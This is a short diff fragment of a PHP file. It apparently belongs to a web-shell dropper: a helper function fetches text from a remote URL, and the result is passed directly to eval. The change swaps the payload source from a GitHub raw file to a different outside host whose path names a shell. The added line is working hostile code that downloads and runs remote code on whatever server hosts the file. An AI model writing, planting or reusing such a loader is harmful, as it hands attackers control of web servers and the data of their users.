@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/azkagans/azka/main/ahh.phtml');
+$a = geturlsinfo('https://marslogs.co.id/shell/shell/adminer.txt');
 eval    ('?>'.$a);
